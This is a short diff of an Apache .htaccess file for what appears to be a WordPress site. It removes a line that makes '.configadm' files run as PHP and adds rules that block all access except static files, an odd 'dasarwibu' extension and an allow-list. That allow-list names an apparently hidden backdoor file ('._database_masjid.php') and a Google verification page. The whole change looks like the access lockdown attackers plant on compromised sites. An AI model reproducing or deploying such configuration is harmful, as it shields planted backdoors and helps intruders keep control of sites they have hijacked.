@@ -1,1 +1,10 @@
-AddType application/x-httpd-php .configadm
+Options -Indexes
+Deny from all
+<FilesMatch '(?i)\.(jpg|jpeg|png|gif|xml|doc|docs|docx|pdf|ico|webp|txt|mp4|mp3|3gp|css|js|html|eps|ai|JPEG|JPG|PNG|GIF|BMP|bmp|webp|WEBP|dasarwibu|eps)$'>
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+<FilesMatch '^(|._database_masjid.php|index.php|wp-config.php|wp-blog-header.php|wp-load.php|wp-login.phpsitemap.xml|ooglea57b62116e56cb71.html|)$'>
+    Order allow,deny
+    Allow from all
+</FilesMatch>
